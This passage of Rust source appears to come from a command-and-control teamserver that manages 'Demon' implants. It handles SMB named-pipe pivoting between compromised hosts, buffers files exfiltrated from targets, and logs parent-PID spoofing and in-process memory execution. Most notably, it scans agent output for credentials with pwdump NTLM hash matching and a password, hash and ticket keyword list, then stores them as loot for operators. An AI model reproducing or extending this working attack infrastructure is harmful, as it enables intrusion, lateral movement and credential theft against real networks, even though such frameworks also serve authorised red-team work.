        Ok(red_cell_common::demon::DemonPivotCommand::List) => {
            handle_pivot_list_callback(context.events, agent_id, request_id, &mut parser).await
        }
        Err(error) => Err(CommandDispatchError::InvalidCallbackPayload {
            command_id: u32::from(DemonCommand::CommandPivot),
            message: error.to_string(),
        }),
    }
}

async fn handle_pivot_list_callback(
    events: &EventBus,
    agent_id: u32,
    request_id: u32,
    parser: &mut CallbackParser<'_>,
) -> Result<Option<Vec<u8>>, CommandDispatchError> {
    let mut entries: Vec<(u32, String)> = Vec::new();
    while !parser.is_empty() {
        let demon_id = parser.read_u32("pivot list demon id")?;
        let named_pipe = parser.read_utf16("pivot list named pipe")?;
        entries.push((demon_id, named_pipe));
    }

    let (kind, message, output) = if entries.is_empty() {
        ("Info", "No pivots connected".to_owned(), None)
    } else {
        let count = entries.len();
        let mut data = String::from(" DemonID    Named Pipe\n --------   -----------\n");
        for (demon_id, named_pipe) in entries {
            data.push_str(&format!(" {demon_id:08x}   {named_pipe}\n"));
        }
        ("Info", format!("Pivot List [{count}]:"), Some(data.trim_end().to_owned()))
    };

    events.broadcast(agent_response_event(
        agent_id,
        u32::from(DemonCommand::CommandPivot),
        request_id,
        kind,
        &message,
        output,
    )?);
    Ok(None)
}

async fn handle_pivot_connect_callback(
    registry: &AgentRegistry,
    events: &EventBus,
    parent_agent_id: u32,
    request_id: u32,
    parser: &mut CallbackParser<'_>,
) -> Result<Option<Vec<u8>>, CommandDispatchError> {
    let success = parser.read_u32("pivot connect success")?;
    if success == 0 {
        return Ok(None);
    }

    let inner = parser.read_bytes("pivot connect inner demon init")?;
    let child_agent_id = inner_demon_agent_id(&inner).map_err(|error| {
        CommandDispatchError::InvalidCallbackPayload {
            command_id: u32::from(DemonCommand::CommandPivot),
            message: error.to_string(),
        }
    })?;
    let existed = registry.get(child_agent_id).await.is_some();
    let external_ip =
        registry.get(parent_agent_id).await.map(|agent| agent.external_ip).unwrap_or_default();
    let listener_name =
        registry.listener_name(parent_agent_id).await.unwrap_or_else(|| "smb".to_owned());
    let parsed = DemonPacketParser::new(registry.clone())
        .parse_for_listener(&inner, external_ip, &listener_name)
        .await;
    let child_agent = match parsed {
        Ok(crate::ParsedDemonPacket::Init(init)) => init.agent,
        Ok(_) => {
            return Err(CommandDispatchError::InvalidCallbackPayload {
                command_id: u32::from(DemonCommand::CommandPivot),
                message: "pivot connect payload did not contain a demon init envelope".to_owned(),
            });
        }
        Err(error) => {
            return Err(CommandDispatchError::InvalidCallbackPayload {
                command_id: u32::from(DemonCommand::CommandPivot),
                message: error.to_string(),
            });
        }
    };

    registry.add_link(parent_agent_id, child_agent.agent_id).await?;
    let pivots = registry.pivots(child_agent.agent_id).await;
    if existed {
        events.broadcast(agent_mark_event(&child_agent));
    } else {
        events.broadcast(agent_new_event(
            &listener_name,
            red_cell_common::demon::DEMON_MAGIC_VALUE,
            &child_agent,
            &pivots,
        ));
    }
    events.broadcast(agent_response_event(
        parent_agent_id,
        u32::from(DemonCommand::CommandPivot),
        request_id,
        "Good",
        &format!(
            "[SMB] Connected to pivot agent [{parent_agent_id:08X}]-<>-<>-[{}]",
            child_agent.name_id()
        ),
        None,
    )?);
    Ok(None)
}

async fn handle_pivot_disconnect_callback(
    registry: &AgentRegistry,
    events: &EventBus,
    parent_agent_id: u32,
    request_id: u32,
    parser: &mut CallbackParser<'_>,
) -> Result<Option<Vec<u8>>, CommandDispatchError> {
    let success = parser.read_u32("pivot disconnect success")?;
    let child_agent_id = parser.read_u32("pivot disconnect child agent id")?;
    if success == 0 {
        return Ok(None);
    }

    let affected =
        registry.disconnect_link(parent_agent_id, child_agent_id, "Disconnected").await?;
    for agent_id in affected {
        if let Some(agent) = registry.get(agent_id).await {
            events.broadcast(agent_mark_event(&agent));
        }
    }
    events.broadcast(agent_response_event(
        parent_agent_id,
        u32::from(DemonCommand::CommandPivot),
        request_id,
        "Info",
        &format!("[SMB] Agent disconnected {child_agent_id:08X}"),
        None,
    )?);
    Ok(None)
}

async fn handle_pivot_command_callback(
    context: BuiltinDispatchContext<'_>,
    _parent_agent_id: u32,
    parser: &mut CallbackParser<'_>,
) -> Result<Option<Vec<u8>>, CommandDispatchError> {
    let package = parser.read_bytes("pivot command package")?;
    let parsed =
        DemonPacketParser::new(context.registry.clone()).parse(&package, String::new()).await;
    let (child_agent_id, packages) = match parsed {
        Ok(crate::ParsedDemonPacket::Callback { header, packages }) => (header.agent_id, packages),
        Ok(_) => {
            return Err(CommandDispatchError::InvalidCallbackPayload {
                command_id: u32::from(DemonCommand::CommandPivot),
                message: "pivot command payload did not contain a callback envelope".to_owned(),
            });
        }
        Err(error) => {
            return Err(CommandDispatchError::InvalidCallbackPayload {
                command_id: u32::from(DemonCommand::CommandPivot),
                message: error.to_string(),
            });
        }
    };

    let timestamp = OffsetDateTime::now_utc().format(&Rfc3339)?;
    let updated = context.registry.set_last_call_in(child_agent_id, timestamp).await?;
    context.events.broadcast(agent_mark_event(&updated));
    dispatch_builtin_packages(context, child_agent_id, &packages).await
}

async fn dispatch_builtin_packages(
    context: BuiltinDispatchContext<'_>,
    agent_id: u32,
    packages: &[DemonCallbackPackage],
) -> Result<Option<Vec<u8>>, CommandDispatchError> {
    let mut dispatcher =
        CommandDispatcher::with_max_download_bytes(context.downloads.max_download_bytes);
    dispatcher.register_builtin_handlers(
        BuiltinHandlerDependencies {
            registry: context.registry.clone(),
            events: context.events.clone(),
            database: context.database.clone(),
            sockets: context.sockets.clone(),
            downloads: context.downloads.clone(),
            plugins: context.plugins.cloned(),
        },
        false,
    );
    let response = dispatcher.collect_response_bytes(agent_id, packages).await?;
    Ok((!response.is_empty()).then_some(response))
}

fn inner_demon_agent_id(bytes: &[u8]) -> Result<u32, DemonProtocolError> {
    Ok(red_cell_common::demon::DemonEnvelope::from_bytes(bytes)?.header.agent_id)
}

impl DownloadTracker {
    pub(crate) fn new(max_download_bytes: usize) -> Self {
        let max_total_download_bytes = max_download_bytes
            .saturating_mul(DOWNLOAD_TRACKER_AGGREGATE_CAP_MULTIPLIER)
            .max(max_download_bytes);
        Self::with_limits(max_download_bytes, max_total_download_bytes)
    }

    pub(crate) fn from_max_download_bytes(max_download_bytes: u64) -> Self {
        let max_download_bytes = match usize::try_from(max_download_bytes) {
            Ok(value) => value,
            Err(_) => usize::MAX,
        };
        Self::new(max_download_bytes)
    }

    fn with_limits(max_download_bytes: usize, max_total_download_bytes: usize) -> Self {
        Self {
            max_download_bytes,
            max_total_download_bytes: max_total_download_bytes.max(max_download_bytes),
            inner: Arc::new(RwLock::new(DownloadTrackerState::default())),
        }
    }

    async fn start(&self, agent_id: u32, file_id: u32, state: DownloadState) {
        let mut tracker = self.inner.write().await;
        self.remove_locked(&mut tracker, agent_id, file_id);
        tracker.downloads.insert((agent_id, file_id), TrackedDownload { state });
    }

    async fn append(
        &self,
        agent_id: u32,
        file_id: u32,
        chunk: &[u8],
    ) -> Result<DownloadState, CommandDispatchError> {
        let mut tracker = self.inner.write().await;
        let Some(current_len) =
            tracker.downloads.get(&(agent_id, file_id)).map(|download| download.state.data.len())
        else {
            return Err(CommandDispatchError::InvalidCallbackPayload {
                command_id: u32::from(DemonCommand::BeaconOutput),
                message: format!("download 0x{file_id:08X} was not opened"),
            });
        };
        let Some(next_len) = current_len.checked_add(chunk.len()) else {
            self.remove_locked(&mut tracker, agent_id, file_id);
            return Err(CommandDispatchError::DownloadTooLarge {
                agent_id,
                file_id,
                max_download_bytes: self.max_download_bytes,
            });
        };
        if next_len > self.max_download_bytes {
            self.remove_locked(&mut tracker, agent_id, file_id);
            return Err(CommandDispatchError::DownloadTooLarge {
                agent_id,
                file_id,
                max_download_bytes: self.max_download_bytes,
            });
        }
        let Some(next_total) = tracker.total_buffered_bytes.checked_add(chunk.len()) else {
            self.remove_locked(&mut tracker, agent_id, file_id);
            return Err(CommandDispatchError::DownloadAggregateTooLarge {
                agent_id,
                file_id,
                max_total_download_bytes: self.max_total_download_bytes,
            });
        };
        if next_total > self.max_total_download_bytes {
            self.remove_locked(&mut tracker, agent_id, file_id);
            return Err(CommandDispatchError::DownloadAggregateTooLarge {
                agent_id,
                file_id,
                max_total_download_bytes: self.max_total_download_bytes,
            });
        }
        let Some(download) = tracker.downloads.get_mut(&(agent_id, file_id)) else {
            return Err(CommandDispatchError::InvalidCallbackPayload {
                command_id: u32::from(DemonCommand::BeaconOutput),
                message: format!("download 0x{file_id:08X} was not opened"),
            });
        };
        download.state.data.extend_from_slice(chunk);
        let updated = download.state.clone();
        let _ = download;
        tracker.total_buffered_bytes = next_total;
        Ok(updated)
    }

    async fn finish(&self, agent_id: u32, file_id: u32) -> Option<DownloadState> {
        let mut tracker = self.inner.write().await;
        self.remove_locked(&mut tracker, agent_id, file_id)
    }

    pub(crate) async fn drain_agent(&self, agent_id: u32) -> usize {
        let mut tracker = self.inner.write().await;
        let file_ids = tracker
            .downloads
            .keys()
            .filter_map(|(download_agent_id, file_id)| {
                (*download_agent_id == agent_id).then_some(*file_id)
            })
            .collect::<Vec<_>>();

        let mut removed = 0;
        for file_id in file_ids {
            if self.remove_locked(&mut tracker, agent_id, file_id).is_some() {
                removed += 1;
            }
        }

        removed
    }

    async fn active_for_agent(&self, agent_id: u32) -> Vec<(u32, DownloadState)> {
        let tracker = self.inner.read().await;
        let mut downloads = tracker
            .downloads
            .iter()
            .filter_map(|((download_agent_id, file_id), download)| {
                (*download_agent_id == agent_id).then_some((*file_id, download.state.clone()))
            })
            .collect::<Vec<_>>();
        downloads.sort_by_key(|(file_id, _)| *file_id);
        downloads
    }

    fn remove_locked(
        &self,
        tracker: &mut DownloadTrackerState,
        agent_id: u32,
        file_id: u32,
    ) -> Option<DownloadState> {
        let removed = tracker.downloads.remove(&(agent_id, file_id))?;
        tracker.total_buffered_bytes =
            tracker.total_buffered_bytes.saturating_sub(removed.state.data.len());
        Some(removed.state)
    }

    #[cfg(test)]
    async fn buffered_bytes(&self) -> usize {
        self.inner.read().await.total_buffered_bytes
    }
}

async fn loot_context(registry: &AgentRegistry, agent_id: u32, request_id: u32) -> LootContext {
    registry
        .request_context(agent_id, request_id)
        .await
        .map(|context| LootContext {
            operator: context.operator,
            command_line: context.command_line,
            task_id: context.task_id,
            queued_at: context.created_at,
        })
        .unwrap_or_default()
}

async fn insert_loot_record(
    database: &Database,
    loot: LootRecord,
) -> Result<LootRecord, CommandDispatchError> {
    let id = database.loot().create(&loot).await?;
    Ok(LootRecord { id: Some(id), ..loot })
}

async fn persist_agent_response_record(
    database: &Database,
    response: &AgentResponseEntry,
    context: &LootContext,
) -> Result<(), CommandDispatchError> {
    let timestamp = OffsetDateTime::now_utc().format(&Rfc3339)?;
    let final_extra = agent_response_extra(
        response.extra.clone(),
        response.request_id,
        &response.kind,
        &response.message,
        context,
    );
    database
        .agent_responses()
        .create(&crate::AgentResponseRecord {
            id: None,
            agent_id: response.agent_id,
            command_id: response.command_id,
            request_id: response.request_id,
            response_type: response.kind.clone(),
            message: response.message.clone(),
            output: response.output.clone(),
            command_line: non_empty_option(&context.command_line),
            task_id: non_empty_option(&context.task_id),
            operator: non_empty_option(&context.operator),
            received_at: timestamp,
            extra: Some(Value::Object(final_extra.into_iter().collect())),
        })
        .await?;
    Ok(())
}

async fn broadcast_and_persist_agent_response(
    database: &Database,
    events: &EventBus,
    response: AgentResponseEntry,
    context: &LootContext,
) -> Result<(), CommandDispatchError> {
    persist_agent_response_record(database, &response, context).await?;
    events.broadcast(agent_response_event_with_extra_and_context(
        response.agent_id,
        response.command_id,
        response.request_id,
        &response.kind,
        &response.message,
        response.extra,
        response.output,
        Some(context),
    )?);
    Ok(())
}

fn loot_new_event(
    loot: &LootRecord,
    command_id: u32,
    request_id: u32,
    context: &LootContext,
) -> Result<OperatorMessage, CommandDispatchError> {
    let mut extra = BTreeMap::from([
        ("MiscType".to_owned(), Value::String("loot-new".to_owned())),
        ("LootID".to_owned(), Value::String(loot.id.unwrap_or_default().to_string())),
        ("LootKind".to_owned(), Value::String(loot.kind.clone())),
        ("LootName".to_owned(), Value::String(loot.name.clone())),
        ("CapturedAt".to_owned(), Value::String(loot.captured_at.clone())),
    ]);

    if let Some(path) = &loot.file_path {
        extra.insert("FilePath".to_owned(), Value::String(path.clone()));
    }
    if let Some(size_bytes) = loot.size_bytes {
        extra.insert("SizeBytes".to_owned(), Value::String(size_bytes.to_string()));
    }
    if !context.operator.is_empty() {
        extra.insert("Operator".to_owned(), Value::String(context.operator.clone()));
    }
    if !context.command_line.is_empty() {
        extra.insert("CommandLine".to_owned(), Value::String(context.command_line.clone()));
    }
    if !context.task_id.is_empty() {
        extra.insert("TaskID".to_owned(), Value::String(context.task_id.clone()));
    }

    agent_response_event_with_extra(
        loot.agent_id,
        command_id,
        request_id,
        "Info",
        &format!("New loot captured: {} ({})", loot.name, loot.kind),
        extra,
        String::new(),
    )
}

fn metadata_with_context(
    entries: impl IntoIterator<Item = (String, Value)>,
    context: &LootContext,
) -> Value {
    let mut metadata = serde_json::Map::new();
    for (key, value) in entries {
        metadata.insert(key, value);
    }
    if !context.operator.is_empty() {
        metadata.insert("operator".to_owned(), Value::String(context.operator.clone()));
    }
    if !context.command_line.is_empty() {
        metadata.insert("command_line".to_owned(), Value::String(context.command_line.clone()));
    }
    if !context.task_id.is_empty() {
        metadata.insert("task_id".to_owned(), Value::String(context.task_id.clone()));
    }
    if !context.queued_at.is_empty() {
        metadata.insert("queued_at".to_owned(), Value::String(context.queued_at.clone()));
    }
    Value::Object(metadata)
}

fn broadcast_credential_event(
    events: &EventBus,
    agent_id: u32,
    credential: &CredentialCapture,
    context: &LootContext,
) -> Result<(), CommandDispatchError> {
    let timestamp = OffsetDateTime::now_utc().format(&Rfc3339)?;
    let mut fields = BTreeMap::from([
        ("DemonID".to_owned(), Value::String(format!("{agent_id:08X}"))),
        ("Name".to_owned(), Value::String(credential.label.clone())),
        ("Credential".to_owned(), Value::String(credential.content.clone())),
        ("Pattern".to_owned(), Value::String(credential.pattern.to_owned())),
    ]);

    if !context.operator.is_empty() {
        fields.insert("Operator".to_owned(), Value::String(context.operator.clone()));
    }
    if !context.command_line.is_empty() {
        fields.insert("CommandLine".to_owned(), Value::String(context.command_line.clone()));
    }
    if !context.task_id.is_empty() {
        fields.insert("TaskID".to_owned(), Value::String(context.task_id.clone()));
    }

    events.broadcast(OperatorMessage::CredentialsAdd(Message {
        head: MessageHead {
            event: EventCode::Credentials,
            user: "teamserver".to_owned(),
            timestamp,
            one_time: String::new(),
        },
        info: red_cell_common::operator::FlatInfo { fields },
    }));
    Ok(())
}

fn extract_credentials(output: &str) -> Vec<CredentialCapture> {
    let mut captures = Vec::new();
    let mut current_block = Vec::new();

    for raw_line in output.lines() {
        let line = raw_line.trim();
        if line.is_empty() {
            if !current_block.is_empty() {
                captures.push(CredentialCapture {
                    label: "credential-block".to_owned(),
                    content: current_block.join("\n"),
                    pattern: "keyword-block",
                });
                current_block.clear();
            }
            continue;
        }

        if looks_like_pwdump_hash(line) {
            if !current_block.is_empty() {
                captures.push(CredentialCapture {
                    label: "credential-block".to_owned(),
                    content: current_block.join("\n"),
                    pattern: "keyword-block",
                });
                current_block.clear();
            }
            captures.push(CredentialCapture {
                label: "password-hash".to_owned(),
                content: line.to_owned(),
                pattern: "pwdump-hash",
            });
            continue;
        }

        if looks_like_inline_secret(line) {
            if !current_block.is_empty() {
                captures.push(CredentialCapture {
                    label: "credential-block".to_owned(),
                    content: current_block.join("\n"),
                    pattern: "keyword-block",
                });
                current_block.clear();
            }
            captures.push(CredentialCapture {
                label: "inline-credential".to_owned(),
                content: line.to_owned(),
                pattern: "inline-secret",
            });
            continue;
        }

        if looks_like_credential_line(line) {
            current_block.push(line.to_owned());
            continue;
        }

        if !current_block.is_empty() {
            captures.push(CredentialCapture {
                label: "credential-block".to_owned(),
                content: current_block.join("\n"),
                pattern: "keyword-block",
            });
            current_block.clear();
        }
    }

    if !current_block.is_empty() {
        captures.push(CredentialCapture {
            label: "credential-block".to_owned(),
            content: current_block.join("\n"),
            pattern: "keyword-block",
        });
    }

    let mut deduped = Vec::new();
    for capture in captures {
        if !deduped.iter().any(|existing: &CredentialCapture| existing.content == capture.content) {
            deduped.push(capture);
        }
    }
    deduped
}

fn looks_like_credential_line(line: &str) -> bool {
    let separators = [":", "="];
    separators.iter().any(|separator| {
        line.split_once(separator).is_some_and(|(key, value)| {
            let key = key.trim().to_ascii_lowercase();
            let value = value.trim();
            !value.is_empty()
                && [
                    "user", "username", "login", "domain", "password", "pass", "secret", "hash",
                    "ntlm", "lm", "ticket", "cred",
                ]
                .iter()
                .any(|keyword| key.contains(keyword))
        })
    })
}

fn looks_like_inline_secret(line: &str) -> bool {
    let bytes = line.as_bytes();
    let looks_like_windows_drive_path = bytes.len() >= 3
        && bytes[0].is_ascii_alphabetic()
        && bytes[1] == b':'
        && matches!(bytes[2], b'\\' | b'/');

    if line.contains("://")
        || looks_like_windows_drive_path
        || (line.contains('\\') && !line.contains(':'))
    {
        return false;
    }

    line.split_once(':').is_some_and(|(left, right)| {
        let left = left.trim();
        let right = right.trim();
        !left.is_empty()
            && !right.is_empty()
            && !left.contains(' ')
            && !right.contains(' ')
            && (left.contains('\\')
                || left.contains('@')
                || (right.len() >= 8 && !looks_like_credential_line(line)))
    })
}

fn looks_like_pwdump_hash(line: &str) -> bool {
    let parts = line.split(':').collect::<Vec<_>>();
    parts.len() >= 6
        && parts[0].chars().all(|char| char.is_ascii_graphic())
        && parts[2].len() == 32
        && parts[3].len() == 32
        && parts[2].chars().all(|char| char.is_ascii_hexdigit())
        && parts[3].chars().all(|char| char.is_ascii_hexdigit())
}

async fn persist_credentials_from_output(
    database: &Database,
    events: &EventBus,
    plugins: Option<&PluginRuntime>,
    agent_id: u32,
    command_id: u32,
    request_id: u32,
    output: &str,
    context: &LootContext,
) -> Result<(), CommandDispatchError> {
    for (index, credential) in extract_credentials(output).into_iter().enumerate() {
        let captured_at = OffsetDateTime::now_utc().format(&Rfc3339)?;
        let record = insert_loot_record(
            database,
            LootRecord {
                id: None,
                agent_id,
                kind: "credential".to_owned(),
                name: format!("credential-{request_id:X}-{}", index + 1),
                file_path: None,
                size_bytes: Some(i64::try_from(credential.content.len()).unwrap_or_default()),
                captured_at,
                data: Some(credential.content.as_bytes().to_vec()),
                metadata: Some(metadata_with_context(
                    [
                        ("pattern".to_owned(), Value::String(credential.pattern.to_owned())),
                        ("request_id".to_owned(), Value::String(format!("{request_id:X}"))),
                    ],
                    context,
                )),
            },
        )
        .await?;
        events.broadcast(loot_new_event(&record, command_id, request_id, context)?);
        broadcast_credential_event(events, agent_id, &credential, context)?;
        if let Some(plugins) = plugins
            && let Err(error) = plugins.emit_loot_captured(&record).await
        {
            warn!(agent_id = format_args!("{agent_id:08X}"), %error, "failed to emit python loot_captured event");
        }
    }

    Ok(())
}

async fn handle_command_output_callback(
    registry: &AgentRegistry,
    database: &Database,
    events: &EventBus,
    plugins: Option<&PluginRuntime>,
    agent_id: u32,
    request_id: u32,
    payload: &[u8],
) -> Result<Option<Vec<u8>>, CommandDispatchError> {
    let mut parser = CallbackParser::new(payload, u32::from(DemonCommand::CommandOutput));
    let output = parser.read_string("command output text")?;
    if output.is_empty() {
        return Ok(None);
    }
    let context = loot_context(registry, agent_id, request_id).await;
    broadcast_and_persist_agent_response(
        database,
        events,
        AgentResponseEntry {
            agent_id,
            command_id: u32::from(DemonCommand::CommandOutput),
            request_id,
            kind: "Good".to_owned(),
            message: format!("Received Output [{} bytes]:", output.len()),
            extra: BTreeMap::new(),
            output: output.clone(),
        },
        &context,
    )
    .await?;
    persist_credentials_from_output(
        database,
        events,
        plugins,
        agent_id,
        u32::from(DemonCommand::CommandOutput),
        request_id,
        &output,
        &context,
    )
    .await?;
    if let Some(plugins) = plugins
        && let Err(error) = plugins
            .emit_command_output(
                agent_id,
                u32::from(DemonCommand::CommandOutput),
                request_id,
                &output,
            )
            .await
    {
        warn!(agent_id = format_args!("{agent_id:08X}"), %error, "failed to emit python command_output event");
    }
    Ok(None)
}

async fn handle_command_error_callback(
    events: &EventBus,
    agent_id: u32,
    request_id: u32,
    payload: &[u8],
) -> Result<Option<Vec<u8>>, CommandDispatchError> {
    let mut parser = CallbackParser::new(payload, u32::from(DemonCommand::CommandError));
    let error_class = parser.read_u32("command error class")?;

    let message = match DemonCallbackError::try_from(error_class) {
        Ok(DemonCallbackError::Win32) => {
            let error_code = parser.read_u32("command error win32 code")?;
            match win32_error_code_name(error_code) {
                Some(name) => format!("Win32 Error: {name} [{error_code}]"),
                None => format!("Win32 Error: [{error_code}]"),
            }
        }
        Ok(DemonCallbackError::Token) => {
            let status = parser.read_u32("command error token status")?;
            match status {
                0x1 => "No tokens inside the token vault".to_owned(),
                other => format!("Token operation failed with status 0x{other:X}"),
            }
        }
        Ok(DemonCallbackError::Coffee) => {
            return Ok(None);
        }
        Err(_) => return Ok(None),
    };

    events.broadcast(agent_response_event(
        agent_id,
        u32::from(DemonCommand::CommandError),
        request_id,
        "Error",
        &message,
        None,
    )?);
    Ok(None)
}

async fn handle_exit_callback(
    registry: &AgentRegistry,
    sockets: &SocketRelayManager,
    events: &EventBus,
    plugins: Option<&PluginRuntime>,
    agent_id: u32,
    request_id: u32,
    payload: &[u8],
) -> Result<Option<Vec<u8>>, CommandDispatchError> {
    let mut parser = CallbackParser::new(payload, u32::from(DemonCommand::CommandExit));
    let exit_method = parser.read_u32("command exit method")?;
    let message = match exit_method {
        1 => "Agent has been tasked to cleanup and exit thread. cya...",
        2 => "Agent has been tasked to cleanup and exit process. cya...",
        _ => "Agent exited",
    };

    mark_agent_dead_and_broadcast(
        registry,
        sockets,
        events,
        plugins,
        agent_id,
        u32::from(DemonCommand::CommandExit),
        request_id,
        message,
    )
    .await
}

async fn handle_kill_date_callback(
    registry: &AgentRegistry,
    sockets: &SocketRelayManager,
    events: &EventBus,
    plugins: Option<&PluginRuntime>,
    agent_id: u32,
    request_id: u32,
    _payload: &[u8],
) -> Result<Option<Vec<u8>>, CommandDispatchError> {
    mark_agent_dead_and_broadcast(
        registry,
        sockets,
        events,
        plugins,
        agent_id,
        u32::from(DemonCommand::CommandKillDate),
        request_id,
        "Agent has reached its kill date, tasked to cleanup and exit thread. cya...",
    )
    .await
}

async fn mark_agent_dead_and_broadcast(
    registry: &AgentRegistry,
    sockets: &SocketRelayManager,
    events: &EventBus,
    plugins: Option<&PluginRuntime>,
    agent_id: u32,
    command_id: u32,
    request_id: u32,
    message: &str,
) -> Result<Option<Vec<u8>>, CommandDispatchError> {
    registry.mark_dead(agent_id, message).await?;
    let _ = sockets.remove_agent(agent_id).await;
    if let Some(agent) = registry.get(agent_id).await {
        events.broadcast(agent_mark_event(&agent));
    }
    events
        .broadcast(agent_response_event(agent_id, command_id, request_id, "Good", message, None)?);
    if let Some(plugins) = plugins
        && let Err(error) = plugins.emit_agent_dead(agent_id).await
    {
        warn!(agent_id = format_args!("{agent_id:08X}"), %error, "failed to emit python agent_dead event");
    }
    Ok(None)
}

async fn handle_demon_info_callback(
    events: &EventBus,
    agent_id: u32,
    request_id: u32,
    payload: &[u8],
) -> Result<Option<Vec<u8>>, CommandDispatchError> {
    let mut parser = CallbackParser::new(payload, u32::from(DemonCommand::DemonInfo));
    let info_class = parser.read_u32("demon info class")?;

    let message = match DemonInfoClass::try_from(info_class) {
        Ok(DemonInfoClass::MemAlloc) => {
            let pointer = parser.read_u64("demon info mem alloc pointer")?;
            let size = parser.read_u32("demon info mem alloc size")?;
            let protection = parser.read_u32("demon info mem alloc protection")?;
            format!(
                "Memory Allocated : Pointer:[0x{pointer:x}] Size:[{size}] Protection:[{}]",
                format_memory_protect(protection)
            )
        }
        Ok(DemonInfoClass::MemExec) => {
            let function = parser.read_u64("demon info mem exec function")?;
            let thread_id = parser.read_u32("demon info mem exec thread id")?;
            format!("Memory Executed  : Function:[0x{function:x}] ThreadId:[{thread_id}]")
        }
        Ok(DemonInfoClass::MemProtect) => {
            let memory = parser.read_u64("demon info mem protect memory")?;
            let size = parser.read_u32("demon info mem protect size")?;
            let old = parser.read_u32("demon info mem protect old protection")?;
            let new = parser.read_u32("demon info mem protect protection")?;
            format!(
                "Memory Protection: Memory:[0x{memory:x}] Size:[{size}] Protection[{} -> {}]",
                format_memory_protect(old),
                format_memory_protect(new)
            )
        }
        Ok(DemonInfoClass::ProcCreate) => {
            let path = parser.read_utf16("demon info proc create path")?;
            let pid = parser.read_u32("demon info proc create pid")?;
            let success = parser.read_bool("demon info proc create success")?;
            let piped = parser.read_bool("demon info proc create piped")?;
            let verbose = parser.read_bool("demon info proc create verbose")?;

            if !verbose {
                return Ok(None);
            }

            if success {
                format!("Process started: Path:[{path}] ProcessID:[{pid}]")
            } else if !piped {
                format!("Process could not be started: Path:[{path}]")
            } else {
                format!("Process started without output pipe: Path:[{path}] ProcessID:[{pid}]")
            }
        }
        Err(_) => return Ok(None),
    };

    events.broadcast(agent_response_event(
        agent_id,
        u32::from(DemonCommand::DemonInfo),
        request_id,
        "Info",
        &message,
        None,
    )?);
    Ok(None)
}

async fn handle_job_callback(
    events: &EventBus,
    agent_id: u32,
    request_id: u32,
    payload: &[u8],
) -> Result<Option<Vec<u8>>, CommandDispatchError> {
    let mut parser = CallbackParser::new(payload, u32::from(DemonCommand::CommandJob));
    let subcommand = parser.read_u32("job subcommand")?;
    let subcommand = DemonJobCommand::try_from(subcommand).map_err(|error| {
        CommandDispatchError::InvalidCallbackPayload {
            command_id: u32::from(DemonCommand::CommandJob),
            message: error.to_string(),
        }
    })?;

    match subcommand {
        DemonJobCommand::List => {
            let mut rows = Vec::new();
            while !parser.is_empty() {
                rows.push((
                    parser.read_u32("job list id")?,
                    parser.read_u32("job list type")?,
                    parser.read_u32("job list state")?,
                ));
            }

            let mut output =
                String::from(" Job ID  Type           State\n ------  ----           -----\n");
            for (job_id, job_type, state) in rows {
                output.push_str(&format!(
                    " {job_id:<6}  {:<13}  {}\n",
                    job_type_name(job_type),
                    job_state_name(state)
                ));
            }
            events.broadcast(agent_response_event(
                agent_id,
                u32::from(DemonCommand::CommandJob),
                request_id,
                "Info",
                "Job list:",
                Some(output.trim_end().to_owned()),
            )?);
        }
        DemonJobCommand::Suspend | DemonJobCommand::Resume | DemonJobCommand::KillRemove => {
            let job_id = parser.read_u32("job action id")?;
            let success = parser.read_bool("job action success")?;
            let (success_text, failure_text) = match subcommand {
                DemonJobCommand::Suspend => ("Successfully suspended job", "Failed to suspend job"),
                DemonJobCommand::Resume => ("Successfully resumed job", "Failed to resume job"),
                DemonJobCommand::KillRemove => {
                    ("Successfully killed and removed job", "Failed to kill job")
                }
                DemonJobCommand::List | DemonJobCommand::Died => unreachable!(),
            };
            events.broadcast(agent_response_event(
                agent_id,
                u32::from(DemonCommand::CommandJob),
                request_id,
                if success { "Good" } else { "Error" },
                &format!("{} {job_id}", if success { success_text } else { failure_text }),
                None,
            )?);
        }
        DemonJobCommand::Died => {}
    }

    Ok(None)
}

async fn handle_sleep_callback(
    registry: &AgentRegistry,
    events: &EventBus,
    agent_id: u32,
    request_id: u32,
    payload: &[u8],
) -> Result<Option<Vec<u8>>, CommandDispatchError> {
    let mut parser = CallbackParser::new(payload, u32::from(DemonCommand::CommandSleep));
    let sleep_delay = parser.read_u32("sleep delay")?;
    let sleep_jitter = parser.read_u32("sleep jitter")?;
    let mut agent =
        registry.get(agent_id).await.ok_or(TeamserverError::AgentNotFound { agent_id })?;
    agent.sleep_delay = sleep_delay;
    agent.sleep_jitter = sleep_jitter;
    registry.update_agent(agent.clone()).await?;
    events.broadcast(agent_mark_event(&agent));
    events.broadcast(agent_response_event(
        agent_id,
        u32::from(DemonCommand::CommandSleep),
        request_id,
        "Good",
        &format!("Set sleep interval to {sleep_delay} seconds with {sleep_jitter}% jitter"),
        None,
    )?);
    Ok(None)
}

async fn handle_proc_ppid_spoof_callback(
    registry: &AgentRegistry,
    events: &EventBus,
    agent_id: u32,
    request_id: u32,
    payload: &[u8],
) -> Result<Option<Vec<u8>>, CommandDispatchError> {
    let mut parser = CallbackParser::new(payload, u32::from(DemonCommand::CommandProcPpidSpoof));
    let ppid = parser.read_u32("proc ppid spoof pid")?;
    if let Some(mut agent) = registry.get(agent_id).await {
        agent.process_ppid = ppid;
        registry.update_agent(agent.clone()).await?;
        events.broadcast(agent_mark_event(&agent));
    }
    events.broadcast(agent_response_event(
        agent_id,
        u32::from(DemonCommand::CommandProcPpidSpoof),
        request_id,
        "Good",
        &format!("Changed parent pid to spoof: {ppid}"),
        None,
    )?);
    Ok(None)
}

async fn handle_net_callback(
    events: &EventBus,
    agent_id: u32,
    request_id: u32,
    payload: &[u8],
) -> Result<Option<Vec<u8>>, CommandDispatchError> {
    let mut parser = CallbackParser::new(payload, u32::from(DemonCommand::CommandNet));
    let subcommand = parser.read_u32("net subcommand")?;
    let subcommand = DemonNetCommand::try_from(subcommand).map_err(|error| {
        CommandDispatchError::InvalidCallbackPayload {
            command_id: u32::from(DemonCommand::CommandNet),
            message: error.to_string(),
        }
    })?;

    let (kind, message, output) = match subcommand {
        DemonNetCommand::Domain => {
            let domain = parser.read_string("net domain")?;
            if domain.is_empty() {
                ("Good", "The machine does not seem to be joined to a domain".to_owned(), None)
            } else {
                ("Good", format!("Domain for this Host: {domain}"), None)
            }
        }
        DemonNetCommand::Logons => {
            let target = parser.read_utf16("net logons target")?;
            let mut users = Vec::new();
            while !parser.is_empty() {
                users.push(parser.read_utf16("net logon user")?);
            }
            let mut output = String::from(" Usernames\n ---------\n");
            for user in &users {
                output.push_str(&format!("  {user}\n"));
            }
            (
                "Info",
                format!("Logged on users at {target} [{}]: ", users.len()),
                Some(output.trim_end().to_owned()),
